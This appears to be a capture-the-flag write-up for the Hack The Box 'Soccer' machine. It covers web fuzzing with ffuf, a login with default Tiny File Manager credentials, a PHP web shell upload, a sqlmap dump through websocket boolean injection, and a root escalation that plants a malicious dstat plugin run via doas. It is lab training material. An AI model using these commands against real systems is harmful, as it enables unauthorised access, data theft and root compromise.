first nmap

```

starting with the web port 80

nothing interesting at the main page let's fuzz

I found a cms tiny
```bash
ffuf -u http://soccer.htb/FUZZ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -ic
```

we have tiny file manager
![/home/user/myblog/_site](/assets/img/posts/Soccer/Pasted image 20240524224934.png)

a quick google search got as the default creds `admin admin@123`
we can upload anything we want , so let's upload a php file and get rce 

I used [phpbash](https://github.com/Arrexel/phpbash)

nothing Interesting , I will run `linpeas`

we got another subdomain , listening on port 80 
![/home/user/myblog/_site](/assets/img/posts/Soccer/Pasted image 20240524225701.png)

after adding it to our /etc/hosts file  
![/home/user/myblog/_site](/assets/img/posts/Soccer/Pasted image 20240524225753.png)

same website but new functionality 

let's create new account and login into the app 

we got this `/check` page , it seems like it's check for a ticket if it's available in the database

![/home/user/myblog/_site](/assets/img/posts/Soccer/Pasted image 20240524230153.png)

the weird thing is I try to intercept this request but I can't catch it 
![/home/user/myblog/_site](/assets/img/posts/Soccer/Pasted image 20240524230353.png)

if we want to catch web sockets , we need to start intercepting from the beginning , like from the sign-in part that's at least what I learned from watching ippsec solving it

there's a  boolean injection via this websocket , if the query i correct returns Exists else return doesn't exist
![/home/user/myblog/_site](/assets/img/posts/Soccer/Pasted image 20240524230732.png)
we can use `sqlmap` to exploit it 
```bash
sqlmap -u ws://soc-player.soccer.htb:9091  --data '{"id":"80989"}' --dbms  mysql --risk 3 --level 5 --batch --dump --thread 10
```
![/home/user/myblog/_site](/assets/img/posts/Union/Pasted image 20240524230947.png)

we can ssh as `player`
![/home/user/myblog/_site](/assets/img/posts/Soccer/Pasted image 20240524231335.png)

```bash
find / -perm -4000 2>/dev/null
```

small research about `doas` seems like small sudo  and we need to find a `doas.conf` file so we now which command is running 

we can run `dstat`` as root
`cat /usr/local/etc/doas.conf`

```bash
echo 'import os; os.execv("/bin/bash", ["bash"])' > /usr/local/share/dstat/dstat_d0s3nt.py`
doas -u root /usr/bin/dstat --d0s3nt
